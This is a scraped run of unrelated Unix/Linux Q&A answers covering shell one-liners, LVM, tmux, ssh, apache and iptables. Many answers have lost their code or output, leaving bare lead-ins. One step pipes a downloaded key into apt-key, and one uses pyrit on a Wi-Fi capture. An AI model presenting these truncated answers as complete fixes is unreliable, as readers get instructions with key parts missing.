bind '"\ee": "g++ !$"' does exactly what you wrote , which is to insert g++ !$ on the command line . if you want the command to be executed , you need to press enter . bind '"\ee": "g++ !$\r"' 
\! is the history number . source .
if you always want the script to timeout after 5 minutes , you can simply use a block in a background process like this . if you use Ctrl+C while it is running , the background process will also terminate : #!/bin/bash { sleep 5m kill $$ } &amp; while true do date sleep 1 done 
let us try and understand from basic . mkdir test touch file mkdir test1 mkdir test2  the ? searches for one , and only one , character . now , when we issue the command ls tes? the output would be , file . it worked because we created a file inside the directory . from man page of ls , NAME ls - list directory contents  the directory test has the file inside and so the ls command actually lists the files that is present inside the directory . now , let us create a file as below . touch ramesh ls rames? ramesh  the reason the above command worked is because ramesh is a file and it is present under the current directory ( as per the ls working , it lists directory contents and in the current directory there is actually a file named ramesh ) . now , let us create a directory named ram1 as below . mkdir ram1 ls ram?  the above outputs nothing . it is because ram1 directory currently has no files inside it . now , if we create another directory named ram2 and try , it works because it first checks if ram1 directory has any files and then checks if ram2 directory has any files . remember ls works on sorting . if you want to see more on the internal working , issue the stat command . in this case , stat ram? would produce the output as ,
i had that problem too some months ago , and i remember i had to delete some .desktop files that were inside the $HOME/.local/share/applications folder . i think you should delete any file that has notepad as part of its name , and also you should try to delete ( or move somewhere else ) the files wine-extension-* .
if you want to wipe out your driver , dban could do it . it supports DoD 5220.22-M , but just for entire drivers . it is a bootable iso . to delete files , scrub is the way , and it supports DoD 5220.22-M , Peter Gutmann's 35 pass , Roy Pfitzner's 33-random-pass/7-random-pass and others . edit . pre-compiled scrub sled package here .
your device is not defined on http://wireless.kernel.org/en/users/devices/usb i also do not see what driver is needed for the chipset . i assume you can use wext driver since it is a generic one , but you need to load the module by modprobe if you do not see the driver on lsmod . but before it , you need to be able to see if the device is working , you can see it by iwconfig if you have the interface . if iwconfig does not output the wifi interface , then you need to verify if you have the correct firmware ( .fw extension ) which is located on /lib/firmware . i think you would save a lot time by selecting any device defined on http://wireless.kernel.org/en/users/devices/usb atheros chipset is the best in my opinion .
it is a known bug ( #906203 ) . apparently , as suggested in the bug report ( https://bugzilla.redhat.com/show_bug.cgi?format=multipleid=906203 ) , doing the following should work : cp /boot/grub2/x86_64-efi/*.mod /boot/efi/fedora/x86_64-efi  you can use a live environment for this combined with chroot . on the other hand , if you have no special need for lvm , use plain old partitions and it should just work ( tm ) .
your ubuntu system has the avahi daemon running while this is not the case for your raspberry pi . install avahi to solve the problem : # apt-get install avahi-daemon avahi-discover libnss-mdns 
unfortunately , anything defined in the shell started by the %prep , %build or %install sections is not preserved in the build environment . you had need to define %{axis2_c} , a macro variable ( not a shell variable ) : %define AXIS2_C /usr/local/something  and then refer to it in both your shells as make whatever FOO=%{AXIS2_C} # or however you used the env variable  and then in the %files section , use %file %{AXIS2_C}/bin/services/services.xml  usually , the initial %define is at the top of the spec file , with some documentation about what it is for . if you need to dynamically set the macro , you will have to use more complex rpm spec macro commands like % ( ) to do shell expansions .
ok , i found how to do this at how to change gnome-shell calendar default application just execute this in a terminal ! ! gsettings set org.gnome.desktop.default-applications.office.calendar exec thunderbird  i have tested it and it works ! ! ( it is not exaclty what i wanted but it is a start )
sure , this arrangement is commonly called " stealth master " . for example , see the article why you should use stealth master dns . the dns system does not make a distinction between " primary " and " secondary " dns servers . there are simply a bunch of ns records listed for each domain , their order or priority is not relevant ( they are all presumed to contain the same data ) . how you arrange distributing the data amongst those ns servers is up to you .
there is standard output ( 1 ) , error output ( 2 ) , and input ( 0 ) . these are the standard file descriptors : now the programmer can open files and every file opening delivers a file descriptor ( for more info http://linux.die.net/man/2/open ) . now let 's look at this : tweedleburg:~ $ wget www.linuxintro.org [...] 2014-01-25 20:43:30 (157 KB/s) - \u2018index.html\u2019 saved [19928]  here the wget programmer decided to open a file ( in this case index . html ) for writing . it got some number as file descriptor but surely not 0 , 1 or 2 . the data from the internet is written into this . wget 's programmer also decided that the " saved " line would be written to the error output stream . i can understand this as wget has or may get a parameter that dumps all data to standard output stream . then it must not be mixed with status information . this is why there are two output streams , standard out for data and error out for error/status messages . i blog about this here : http://www.linuxintro.org/wiki/stdout,_stderr_and_stdin . now to get error output redirected you use the 2> operator , for standard output you use the 1> or > operator : you see - in the second example the error messages are suppressed : )
since you are using xte anyways , why not release the keys with xte ? something along the lines xte "keyup Control_L" xte "keyup l"  ( assuming your shortcut is ctrl-l ) .
try this : $ awk 'FNR==NR{a[FNR]=$2;next}{$NF=a[FNR]}1' file2 file1 A 23 8 0 A 63 9 6 B 45 3 5 
if you look in /etc/lvm/lvm.conf , there is a devices { ... } section . you probably need to adjust the filter to accept /dev/mapper/root as a valid location . the easiest filter would be to accept all devices : filter = [ "a/.*/" ] . you could also accept only the device you are interested in : filter = [ "a|^/dev/mapper/root$|", "r/.*/" ] . your initramfs probably has a different lvm configuration . ( btw : vgscan -vvv is the troubleshooting tool to use here . that should show each block device it checked , and if it found anything there . )
here 's another way to do locking in shell script that can prevent the race condition you describe above , where two jobs may both pass line 3 . the noclobber option will work in ksh and bash . do not use set noclobber because you should not be scripting in csh/tcsh . ; ) ymmv with locking on nfs ( you know , when nfs servers are not reachable ) , but in general it is much more robust than it used to be . ( 10 years ago ) if you have cron jobs that do the same thing at the same time , from multiple servers , but you only need 1 instance to actually run , the something like this might work for you . i have no experience with lockrun , but having a pre-set lock environment prior to the script actually running might help . or it might not . you are just setting the test for the lockfile outside your script in a wrapper , and theoretically , could not you just hit the same race condition if two jobs were called by lockrun at exactly the same time , just as with the ' inside-the-script ' solution ? file locking is pretty much honor system behavior anyways , and any scripts that do not check for the lockfile 's existence prior to running will do whatever they are going to do . just by putting in the lockfile test , and proper behavior , you will be solving 99% of potential problems , if not 100% . if you run into lockfile race conditions a lot , it may be an indicator of a larger problem , like not having your jobs timed right , or perhaps if interval is not as important as the job completing , maybe your job is better suited to be daemonized .
you can not replace multiple things like this with tr . i would use sed to do this instead . example $ sed "s/^/'/" file.txt 'AAAA 'BBBB 'CCCC 'DDDD  says to find the beginning of each line ( ^ ) and replace it with a single quote ( ' ) . if you want to wrap the " words " in single quotes you can use this form of the command : $ sed "s/\(.*\)/'\1'/" file.txt 'AAAA' 'BBBB' 'CCCC' 'DDDD'  this time we are saving anything on the line in a temporary variable ( \1 ) . we then replace the line with this '\1' . this command can be abbreviated to this , use gnu specific switches : $ sed -r "s/^(.*)$/'&amp;'/" file.txt 'AAAA' 'BBBB' 'CCCC' 'DDDD' 
yes , you can do this with the /sys filesystem . /sys is a fake filesystem dynamically generated by the kernel and kernel drivers . in this specific case you can go to /sys/block/sda and you will see a directory for each partition on the drive . there are 2 specific files in those folders you need , start and size . start contains the offset from the beginning of the drive , and size is the size of the partition . just delete the partitions and recreate them with the exact same starts and sizes as found in /sys . for example this is what my drive looks like : and this is what i have in /sys/block/sda: i have tested this to verify information is accurate after modifying the partition table on a running system
i believe it is from loopback , loopback , or loop-back , refers to the routing of electronic signals , digital data streams , or flows of items back to their source without intentional processing or modification . it is a loop device because it is backed by a file on a different file-system . see also loopback device , a loopback device is a mechanism used to interpret files as real devices . the main advantage of this method is that all tools used on real disks can be used with a loopback device .
you are deleting the \; . just do this : find . -type f -exec grep -il "search string" {} \; &gt; log.txt 
take a look at setting up an ad-hoc connect
it is not the kernel that is generating the initramfs , it is cpio . so what you are really looking for is a way to build a cpio archive that contains devices , symbolic links , etc . your method 2 uses usr/gen_init_cpio in the kernel source tree to build the cpio archive during the kernel build . that is indeed a good way of building a cpio archive without having to populate the local filesystem first ( which would require being root to create all the devices , or using fakeroot or a fuse filesystem which i am not sure has been written already ) . all you are missing is generating the input file to gen_init_cpio as a build step . e.g. in shell : if you want to reflect the symbolic links to busybox that are present in your build tree , here 's a way ( i assume you are building on linux ) : here 's a way to copy all your symbolic links : find "$INITRAMFS_SOURCE_DIR" -type l -printf 'slink %p %l 777 0 0\\n'  for busybox , maybe your build tree does not have the symlinks , and instead you want to create one for every utility that you have compiled in . the simplest way i can think of is to look through your busybox build tree for .*.o.cmd files : there is one per generated command .
with gnu tools :
batch mode refers to batch processing , which means automated processing , without human intervention . batch is the opposite of interactive . in batch mode , top produces output that is more sensible for collecting to a log file or for parsing ( though top is not really good at producing parseable output even in batch mode ) . there is no limit on the number of output lines and the output does not contain any escape sequences for formatting . in interactive mode , top produces output intended for human viewing . in particular , it only displays one screenful of data . the output contains some escape sequences for formatting . top operates in interactive mode even when its output is redirected to a file ; only the presence of the -b option matters .
there are two de facto standard escape sequences for cursor keys ; different terminals , or even the same terminal in different modes , can send one or the other . for example , xterm sends \eOA for up in “application cursor mode” and \e[A otherwise . for down you can encounter both \e[B and \eOB , etc . one solution is to duplicate your bindings : whenever you bind one escape sequence , bind the other escape sequence to the same command . another approach is to always bind one escape sequence , and make the other escape sequence inject the other one . bindkey '\e[A' history-beginning-search-backward bindkey '\e[B' history-beginning-search-forward bindkey -s '\eOA' '\e[A' bindkey -s '\eOB' '\e[B'  i do not know why upgrading oh-my-zsh would have affected which escape sequence the shell receives from the terminal . maybe the new version performs some different terminal initialization that enables application cursor mode .
if the processes are somewhat interactive / not suitable for running as daemons , you are looking for something like gnu screen or tmux - both of them allow you to start a session with multiple windows in them and detach and reattach that session : the workflow for screen is similar but i do not know it off the top of my head .
adjust your PATH . it simplifies execution , works as expected , and once you install more applications with your $HOME as prefix , they will all work as expected . i would do something like this in my rc file : PATH=$HOME/bin:$PATH LD_RUN_PATH=$HOME/lib:$LD_RUN_PATH export PATH LD_RUN_PATH  setting LD_RUN_PATH should allow locally-install dsos to work too . what you have done to install emacs so far is pretty much the way it is done in multi-user environments . clarification : paths in unix ( and other software that use them , from dos to tex ) work like lists of places , searched left to right . on unix , we use colons ( : ) to separate the entries . if you have a PATH like /usr/local/bin:/bin:/usr/bin , and you are looking for a program called foo , these paths will be searched for , in order : /usr/local/bin/foo /bin/foo /usr/bin/foo the first of these found is used . so , depending on where exactly you insert a directory , you can make your installed binaries ‘override’ others . conceptually , the order of PATH is traditionally specific-to-generic or local-to-global . ( of course , we often add weird paths to support self-contained third-party applications and this can break this analogy )
i suppose the XMonad.Actions.NoBorders module ( in xmonad-contrib ) is helpful here ( i have not tried it myself , tough ( a ) ) . it exports the toggleBorder function , which [ toggles ] the border of the currently focused window . it is rather small and self-explanatory , so if binding toggleBorder does not do exactly what you want , you probably can adept it to your needs . ( a ) i am not sure what you are about to achieve , but if you had prefer not to have to press a key at all , the XMonad.Layout.NoBorders module is great . it exports the smartBorders layout modifier that removes the borders if it is not needed ( if there is only one window and only one screen , for example ) .
you are right the documentation about unixODBC still rare . for the configurations files , unixODBC use only two config files : /etc/odbcinst.ini : here you define the driver /etc/odbc.ini : informations about connections you can find a great documentation about installing this drivers and libraries on various linux systems here : http://www.asteriskdocs.org/en/3rd_edition/asterisk-book-html-chunk/installing_configuring_odbc.html more complete documentation that include api for various languages can be found here : http://www.easysoft.com/developer/interfaces/odbc/linux.html all the config and installation stuff can be made without gui : ) , an old good terminal shell suffice . from a developer point a view ( iused the c api few years ago , and i remember that it was a non trivial task ) : you need to connect and then perform a request . to connect to the datasource using unixodbc and the C API: init odbc environnement by calling SQLAllocHandle() choose odbc version number with SQLSetEnvAttr() again use SQLAllocHandle() to init the connection handle now you can connect by calling SQLConnect() once you have a connection handle and have connected to a data source you allocate statement handles to execute sql or retrieve meta data . as with the other handles you can set and get statement attributes with SQLSetStmtAttr and SQLGetStmtAttr . here you can find a good documentation on the c api : http://www.easysoft.com/developer/languages/c/odbc_tutorial.html http://www.easysoft.com/developer/languages/c/odbc-tutorial-fetching-results.html http://www.easysoft.com/developer/interfaces/odbc/diagnostics_error_status_codes.html hope this help .
a dhcp server was needed to assign ip addresses to wifi connections . i used dnsmasq , a dns and dhcp server . the following are the commands to start an ad-hoc wifi hotspot :
it was my . xinitrc missing the line exec startkde and cannot start a windowmanager .
change ~/.ssh/ssh_config to ~/.ssh/config . make sure the permissions on it are 700 . this discussion has a lot of good information . you can also follow the tag for ssh ( just click on /ssh under your question ) to go to a tag wiki for more information and trouble shooting guidance .
you can use a temporary sentinel character to delimit the number : $ sed 's/\([0-9]\+\)/;\1/' log | sort -n -t\; -k2,2 | tr -d ';'  here , the sentinel character is ' ; ' - it must not be part of any filename you want to sort - but you can exchange the ' ; ' with any character you like . you have to change the sed , sort and tr part then accordingly . the pipe works as follows : the sed command inserts the sentinel before any number , the sort command interprets the sentinel as field delimiter , sorts with the second field as numeric sort key and the tr commands removes the sentinel again . log denotes the input file - you can also pipe your input into sed .
here 's a small script that checks for the battery level and calls a custom command , here pm-hibernate , in case the battery level is below a certain threshold . it is a very simple script , but i think you get the idea and can easily adapt it to your needs . the path to the battery level might be different on your system . a little more portable would probably be to use something like acpi | cut -f2 -d, to obtain the battery level . this script can be scheduled by cron to run every minute . edit your crontab with crontab -e and add the script : */1 * * * * /home/me/usr/bin/low-battery-shutdown  another solution would be to install a desktop environment like gnome or xfce ( and change your window manager to i3 ) . both mentioned destop environments feature power management daemons which take care of powering off the computer . but i assume you deliberately do not use them and are seeking for a more minimalistic solution .
from the homepage - debian packages : wget -O - http://hwraid.le-vert.net/debian/hwraid.le-vert.net.gpg.key | sudo apt-key add -  the repository is not a default debian repository . it is third party software . debian does not ship with all possible keys . you have to decide if you trust them . if you do , install the key as mentioned above .
perl echo foo bar baz | perl -pe 's/.*[ \t]//'  if you have to strip trailing spaces first , do it like this : echo "foo bar baz " | perl -lpe 's/\s*$//;s/.*\s//'  the following was contributed by mr . spuratic in a comment : echo "foo bar baz " | perl -lane 'print $F[-1]'  bash echo foo bar baz | while read i; do echo ${i##* }; done  or is bash is not your default shell : echo foo bar baz | bash -c 'while read i; do echo ${i##* }; done'  if you have to strip a single trailing space first , do echo "foo bar baz " | while read i; do i="${i% }"; echo ${i##* }; done  tr and tail echo foo bar baz | tr ' ' '\\n' | tail -n1  although this will only work for a single line of input , in contrast to the solutions above . suppressing trailing spaces in this approach : echo "foo bar baz " | tr ' ' '\\n' | grep . | tail -n1 
this will vary from user to user and is subjective , but i think ubuntu is very easy to install and use ( certainly a far cry from the good old days of 20 floppy disks and slackware :- ) specifically , ubuntu has never let me down in detecting and configuring itself to the host hardware , so that is a definite plus . also , it comes with a live cd , so you can try it before you install it . this comparison of linux distributions might be helpful . my opinion ( and it is only that ) is based on using linux since the early 1990s from slackware , red hat , debian , gentoo ( compiled from scratch ) in addition to ubuntu for the last few years .
on linux traditional dos-partitions will show up this way : partitions from 1 to 4 are primary partitions partitions above 5 are logical partitions . in the dos-partitioning-scheme ( this is not linux-specific ) if you want to use logical partitions you have to define a pointer within one of the primary partitions for these . at this pointer the bios will find further information . this pointer ( sda2 ) shows in fdisk as id 5 " extended " - it extends the partitioning-scheme to more than the default 4 partitions normally possible . now your system consists of two partitions : one primary , bootable partition : sda1 ( which was or is part of a linux-raid-array ) and one logical partition : sda5 ( which was or is part of a linux-raid-array ) . there is no place left for additional partitions .
you can not . only unplugging sda will help in this case . in that case sdb will be sda . . . ( braindead linux device numbering - solaris and hp-unix use scsi-ids . ) so for the bootloader you should install it on sda and then copy it with dd to sdb and sdc .
it is not possible to have a file with an empty name . what you have is a file whose name entirely consists of blank or non-printable characters . to see exactly what the file name is , run LC_CTYPE=C ls -b . this replaces all blank or non-printable characters by octal escapes . for example , a file whose name is a single zero-width space would be listed as \342\200\213 . you can isolate this file with a glob that excludes files with a nice name . for example , you could try listing the files whose name does not begin with a letter . chaouche@karabeela /mnt/ubuntu/storage $ ls -d [^A-Za-z]*  do not forget the option -d , so that ls lists the directory itself and not its contents . you should rename the file to have a reasonable name . you can rely on your shell 's completion , or use a glob that matches only this file . mv [^A-Za-z]* windows-programs 
the whole point of the shadow password file is that getpwnam does not return passwords from it . you need to look at man 3 shadow and getspnam in particular .
as ulrich said , you can do this by enabling the userdir module . on debian , this can be done by using the a2enmod utility , which enables or disables apache modules . see man a2enmod . in this case , you just need to run sudo a2enmod userdir  and then restart the apache server to make the change take effect . note that the userdir module is in base apache , so you do not have to install anything extra . for reference the userdir config is in /etc/apache2/mods-available/userdir.conf . all a2enmod is doing here is creating a symbolic link from the /etc/apache2/mods-enabled directory to the files /etc/apache2/mods-available/{userdir.conf/userdir.load} . you could also do this manually . i.e. then put whatever web stuff you want to make available under ~/public_html , and then it should be acccessible from http://servername/~username .
there is the grsecurity patchset ( included in selinux , but does not have the latter 's horribly complicated mac permission system ) for the linux kernel which offers the option of allowing only the owner ( and root ) to see his/her processes . it also offers other goodies without being as intrusive as selinux . a similar option is there on solaris , or so i heard .
check this out .
i would use tr instead of awk : echo "Lorem ipsum dolor sit sit amet." | tr [:space:] '\\n' | grep -v "^\s*$" | sort | uniq -c | sort -bnr  tr just replaces spaces with newlines grep -v "^\s*$" trims out empty lines sort to prepare as input for uniq uniq -c to count occurrences sort -bnr sorts in numeric reverse order while ignoring whitespace wow . it turned out to be a great command to count swear-per-lines find . -name "* . py " -exec cat {} \ ; | tr [ :space : ] '\n ' | grep -v "^\s*$" | sort | uniq -c | sort -bnr | grep fuck
i think that it should do the work : script takes one parameter - number of you new image . ps . put script in another directory than your images . in images directory there should be only images named in this way that you described .
change the name of the executable ( note that that also affects pam configuration ) . ln /path/to/sshd /path/to/sshd-whatever  start as /path/to/sshd-whatever . and define pam configuration in /etc/pam.d/sshd-whatever . log entries will show as sshd-whatever instead of sshd .
tl ; dr ... | tmux loadb - tmux saveb - | ... explanation and background in tmux , all copy/paste activity goes through the buffer stack where the top ( index 0 ) is the most recently copied text and will be used for pasting when no buffer index is explicitly provided with -b . you can inspect the current buffers with tmux list-buffers or the default shortcut tmux-prefix + # . there are two ways for piping into a new tmux buffer at the top of the stack , set-buffer taking a string argument , and load-buffer taking a file argument . to pipe into a buffer you usually want to use load-buffer with stdin , eg . : print -l **/* | tmux loadb -  pasting this back into editors and such is pretty obvious ( tmux-prefix + ] or whatever you have bound paste-buffer to ) , however , accessing the paste from inside the shell is not , because invoking paste-buffer will write the paste into stdin , which ends up in your terminal 's edit buffer , and any newline in the paste will cause the shell to execute whatever has been pasted so far ( potentially a great way to ruin your day ) . there are a couple of ways to approach this : tmux pasteb -s ' ' : -s replaces all line endings ( separators ) with whatever separator you provide . however you still get the behavior of paste-buffer which means that the paste ends up in your terminal edit buffer , which may be what you want , but usually is not . tmux showb | ... : show-buffer prints the buffer to stdout , and is almost what is required , but as chris johnsen mentions in the comments , show-buffer performs octal encoding of non-printable ascii characters and non-ascii characters . this unfortunately breaks often enough to be annoying , with even simple things like null terminated strings or accented latin characters ( eg . ( in zsh ) print -N \xe1 | tmux loadb - ; tmux showb prints \303\241\000 ) . tmux saveb - | ... : save-buffer does simply the reverse of load-buffer and writes the raw bytes unmodified into stdin , which is what is desired in most cases . you could then continue to assemble another pipe , and eg . pass through | xargs -n1 -I{} ... to process line wise , etc . .
a solution : the problem is that this serial port is non-plugnplay , and a system do not know which device was plugged in . anyway , after reading a howto i get the working idea . an *nix-os already have in /dev/ a files like ttysn where a n ending is a number . most of this files is dumb i.e. does not correspond to an existing devices . but some of those is going to refer a real ports . to find which it is , issue a command : above is an example output of my pc . you may see an initialization of a few serial ports , it is a ttys0 , ttys1 , ttys4 , ttys5 . one of those serial ports going to have a positive voltage when a device asserted , so do next : write somewhere a content of file /proc/tty/driver/serial in two cases -- when a device plugged in and when does not . next check the difference between two files . below is output of my pc : $ sudo cat /proc/tty/driver/serial&gt; /tmp/1  ( un ) plug a device that is it ! let 's look now in our output of a dmesg and compare a data : [ 0.872181 ] 00:06: ttys0 at i/o 0x3f8 ( irq = 4 ) is a 16550a so , an our device is /dev/ttys0 , mission complete !
pulseaudio stores stream state for each app independently . this lets you ( for example ) set your music player to a lower volume than your instant message alert tone , so you hear the im alert over the music . if you have pulseaudio 's module-stream-restore loaded—and the default config loads it— , then these settings will be saved when you exit the program and loaded back when you start it again . the settings are saved in ~/.pulse/\u2026stream-volumes.tdb . the easiest way to change them is by starting mplayer again , and then using one of the many pulseaudio uis , e.g. , command-line pactl , gui pavucontrol , etc . to change it . if mplayer is using the pulseaudio mixer ( likely ) , then you can also try m , 9 , and 0 ( mplayer 's default mute and volume keys ) .
you can do it all from your existing repository ( no need to clone the fork into a new ( local ) repository , create your branch , copy your commits/changes , etc . ) . get your commits ready to be published . refine any existing local commits ( e . g . with git commit --amend and/or git rebase --interactive ) . commit any of your uncommitted changes that you want to publish ( i am not sure if you meant to imply that you have some commits on your local master and some uncommitted changes , or just some uncommitted changes ; incidentally , uncommitted changes are not “on a branch” , they are strictly in your working tree ) . rename your master branch to give it the name you want for your “new branch” . this is not strictly necessary ( you can push from any branch to any other branch ) , but it will probably reduce confusion in the long run if your local branch and the branch in your github fork have the same name . git branch -m master my-feature  fork the upstream github repository ( e . g . ) github.com:UpstreamOwner/repostory_name.git as ( e . g . ) github.com:YourUser/repository_name.git . this is done on the github website ( or a “client” that uses the github apis ) , there are no local git commands involved . in your local repository ( the one that was originally cloned from the upstream github repository and has your changes in its master ) , add your fork repository as a remote : git remote add -f github github.com:YourUser/repository_name.git  push your branch to your fork repository on github . git push github my-feature  optionally , rename the remotes so that your fork is known as “origin” and the upstream as “upstream” . git remote rename origin upstream git remote rename github origin  one reason to rename the remotes would be because you want to be able to use git push without specifying a repository ( it defaults to “origin” ) .
you have to change the color of your cursor line to a color other than the color of your cursor . if you are in a terminal emulator like st or rxvt , vim cannot change the color of your cursor ; it will always be the color your terminal application decides to make it . only the graphical version of vim is able to change the color of your cursor . you can change your cursor color through your terminal configuration though . some ~/.Xdefaults / ~/.Xresources examples : XTerm*cursorColor: #FFFFFF URxvt.cursorColor: white  you could also use the vim command :set cursorcolumn to put your cursor in crosshairs .
i think all you need to do is run reset . if that does not help , look to see if you changed any files in /etc recently ( e . g . find /etc -mtime -1 ) and read the unicode_start or consolechars man pages .
i think it is because this line No valid EAOPL-handshake + ESSID detected.  is probably standard error of the pyrit command , not standard out . normally , | pipes standard out to the next command , with the standard error written immediately to the terminal . instead , if you want to pass both standard error and out through the pipe , then you can use |&amp; . i.e. pyrit -r file0.cap analyze |&amp; grep good 
the tool pvs shows the output in whatever units you like . $ pvs PV VG Fmt Attr PSize PFree /dev/sda2 MMB lvm2 a-- 29.69G 6.91G  i noticed this mention in the man page : example you can override the units like so : $ pvs --units m PV VG Fmt Attr PSize PFree /dev/sda2 vg_switchboard lvm2 a-- 37664.00m 0m 
this was my solution :
if you only want ... of all &lt;tr&gt;...&lt;/tr&gt; do : grep -o '&lt;tr&gt;.*&lt;/tr&gt;' HTMLFILE | sed 's/\(&lt;tr&gt;\|&lt;\/tr&gt;\)//g' &gt; NEWFILE for multiline do : cat HTMLFILE | tr "\\n" "|" | grep -o '&lt;tr&gt;.*&lt;/tr&gt;' | sed 's/\(&lt;tr&gt;\|&lt;\/tr&gt;\)//g' | sed 's/|/\\n/g' &gt; NEWFILE check the htmlfile first of the char "|" ( not usual , but possible ) and if it exists , change to one which does not exist .
you can not . the format for /etc/hosts is quite simple , and does not support including extra files . there are a couple approaches you could use instead : set up a ( possibly local-only ) dns server . some of these give a lot of flexibility , and you can definitely spread your host files over multiple files , or even machines . if you are trying to include the same list of hosts on a bunch of machines , then dns is probably the right answer . set up some other name service ( nis , ldap , etc . ) . check the glibc nss docs for what is supported . personally , i think you should use dns in most all cases . make yourself an /etc/hosts.d directory or similar , and write some scripts to concatenate them all together ( most trivial : cat /etc/hosts.d/*.conf &gt; /etc/hosts , though you will probably want a little better to e.g. , sort ) , and run that script at boot , or from cron , or manually whenever you update the files . personally , at both home and work , to have machine names resolvable from every device , i run bind 9 . that does involve a few hours to learn , though .
it seems that the right tool for this job is seccomp . based on fsync-ignoring code by bastian blank , i came up with this relatively small file that causes all its childs to not be able to open a file for writing : here you can see that it is still possible to read files : it does not prevent deleting files , or moving them , or other file operations besides opening , but that could be added . a tool that enables this without having to write c code is syscall_limiter .
sorry , i have found the reason . this is totally because of the SSL CERT problem . not really because of above notices . how do i do was that i enabled the apache detailed logs and then that is the real move . it shows what really is happening , by showing the failure at the loading of mod_ssl module , while starting the apache . then i realized it is because of ssl.conf ( or the respective vhost file ) having the ssl cert configurations inside . there i made 2 mistakes . first , i did not give read permissions to the cert related files ( . crt/ . key/ . csr ) . after that , more badly , one of the file was wrong .
gnuly : gives : the columns are : tokens only in s1 tokens only in s2 tokens in both . you suppress a column by passing the corresponding option ( like -3 to suppress the 3rd column ) .
you need to use mount command as below : sudo mount /dev/sdb1 /mnt/  it will check and automatically detect and mount filesystem i.e. vfat
rsyslog has a mail module , which i suppose you could use in conjunction with the file monitor , and probably learn some stuff about configuring rsyslog in the process , lol . keep in mind that your logging is not part of syslog , which is why you would need to set it up to " monitor another file " . the application could use syslog directly , there is a native facility for this in *nix ( or at least posix ) and i think every programming language will have some interface to it . that means some recoding , of course , but if your logging is modular , you could have syslog as an option . if it is not modular it should be ; ) also , writing a monitor of this sort in something like perl or python would be very simple , i think , since languages like that will have very high level easy to set up email modules .
your problem is here : ssh $machine ls -la &amp;&amp; exit  your script sshs to the remote machine which runs your ls . ssh exits with success , &amp;&amp; sees this and runs the next command which is exit , so your script exits ! you do not need the &amp;&amp; exit at all . when ls finishes , the connection will close and ssh will complete . just remove that bit and you will be golden .
have you tried ssh -t user@server "mail &amp;&amp; bash" ( or replace bash with whatever shell you like ) . the -t is necessary , to create a pseudo-tty for bash to use as an interactive shell .
sudo command has setuid bit set which means that it is always granted privileges of the user who owns the file ( it is always root unless you messed up something yourself ) . so even if you do not have root privileges , sudo will get them anyway . all programs with setuid are written in especially careful way to prevent vulnerabilities . sudo reads sudoers file to determine if you are allowed to execute selected command as root and if you should be prompted for your password . if you are allowed to run the command and the password is correct ( if needed ) , since sudo has root privileges , all of its children ( yum and install scripts maybe ) also gain those privileges . it was especially relevant years ago when mainframes were used by big number of people and users with root access wanted to allow some trusted users to execute some often used and not very dangerous commands . nowadays sudo access is usually granted for all commands ( on home desktops at least ) .
have a look at cdpath in man bash maybe that is already enough . otherwise define some alias in . bashrc . i would suggest : alias setp='pwd &gt;~/.projectdir' alias gop='cd $(cat ~/.projectdir)' 
to find executable files called java under the specified directory : find '/Applications/NetBeans/NetBeans 7.0.app/' -name java -type f -perm -u+x  the output will be one file name per line , e.g. /Applications/NetBeans/NetBeans 7.0.app/Contents/Resources/NetBeans/ExecutableJavaEnv/java  if you want to omit the \u2026/NetBeans 7.0.app part , first switch to the directory and run find on the current directory ( . ) . there will still be a ./ prefix . cd '/Applications/NetBeans/NetBeans 7.0.app/' find . -name java -type f -perm -u+x  strictly speaking , -perm u+x selects all files that are executable by their owner , not all files that you can execute . gnu find has a -executable option to look for files that you have execute permission on , taking all file modes and acls into account , but this option is not available on other systems such as osx . in practice , this is unlikely to matter ; in fact for your use case you can forget about permissions altogether and just match -name java -type f . -type f selects only regular files , not directories or symbolic links . if you want to include symbolic links to regular files in the search , add the -L option to find ( immediately after the find command , before the name of the directory to search ) .
netfilter netfilter is a set of hooks sprawled throughout the networking code in the kernel . this means that if a piece of code is about to do something significant ( we will call it x ) , it calls a function that says " i am about to do x " . that function would then notify any other interested parties via a registered callback . it is also used by other ( not iptables ) systems like ipvs . netfilter also includes mechanisms for passing packets to userspace programs - this is used by iptables for the queue and ulog targets to allow the user to process packets in userspace . ip_tables ( the kernel module ) ip_tables is a module that uses netfilter to get these notices . it identifies packets that it has been told are relevant and does actions it was told to do . it knows which packets are relevant and the actions to perform on them based on rules that the user has given it ; it stores these rules in a table . in fact , it uses a more generic module , xtables , that ip_tables uses . extension modules extension modules do much of the work of providing match criteria and target actions . some examples of extension modules include ip_nf_target_log and nf_nat . iptables ( the userspace tool ) iptables is a userspace tool for setting up those rules in the ip_tables module . the tool also comes with many plugins that parse command-line options and register rules . learn more about iptables internals if you want to learn more of the internals , there is an excellent book about it . the book has all you need if you want to create additional functionality for iptables , but will not do much to further your understanding of how to use iptables . learn more about using iptables if you want to better understand how to use iptables , it is better to read several different pieces of documentation to see things explained in different ways . even more important , is to play with iptables yourself . i particularly appreciated using the log target to see the flow of packets through the tables and chains and the effects of the rules on them . additionally , a chart of the packet flow through the tables is extremely useful . finally , if you are trying to do something with iptables and it is not doing what you expect , ask a specific question here on the site ; there are a number of people who regularly answer questions who are familiar with iptables .
-vnc 127.0.0.1:x: use a vnc terminal emulator to connect to the virtual terminal on port 5900+x at localhost where you can use the given credentials .
so after a lot of toying with this , it started to work , though for the life of me i can not figure out why . here 's a list of things i tried : did not work rebooting unplugging and plugging it back in while the laptop is running booting up with it plugged in plugging it in post-boot up recompiling my kernel with the same options did work recompiling my kernel with usb3 debuging enabled re-recompiling my kernel with usb3 debugging turned off so basically i tried recompiling my kernel with debugging enabled to see what was wrong , and lo-and-behold it worked perfectly . then , as an experiment , i recompiled again , this time with debugging off , and it still worked . i have no idea what happened , but for those who might come here in search of an answer one day , i offer you what i have .
if you have the apt-listchanges package installed , important news about new packages is shown before they are installed . the news is shown with your " pager " , which just displays the text one screen at a time . the method to exit the pager depends on which pager it found , but as sr_ said , q should work .
ah — turns out i think this was actually a vmware issue after all . i disabled printers in vmware’s virtual machine’s settings , and lo and behold , the problem ( seems to have ) disappeared . vmware must have been trying to get printing to work .
